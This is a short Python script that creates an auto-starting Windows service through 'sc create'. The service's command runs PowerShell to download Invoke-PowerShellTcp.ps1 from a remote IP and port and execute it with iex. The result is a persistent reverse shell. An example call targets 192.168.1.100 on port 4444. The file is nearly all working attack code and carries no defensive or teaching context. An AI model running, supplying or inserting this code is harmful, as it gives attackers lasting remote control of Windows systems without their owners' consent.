import subprocess

def setup_reverse_shell_service(service_name, remote_ip, remote_port):
    shell_command = f"powershell -Command \"iex(New-Object Net.WebClient).DownloadString('http://{remote_ip}:{remote_port}/Invoke-PowerShellTcp.ps1')\""
    command_service = f'sc create {service_name} binPath= "cmd.exe /c {shell_command}" start= auto'
    
    result_service = subprocess.run(command_service, shell=True, capture_output=True, text=True)
    if result_service.returncode == 0:
        print(f"Service '{service_name}' created successfully with reverse shell.")
    else:
        print(f"Failed to create service: {result_service.stderr}")

# Example usage
setup_reverse_shell_service("ReverseShellService", "192.168.1.100", "4444")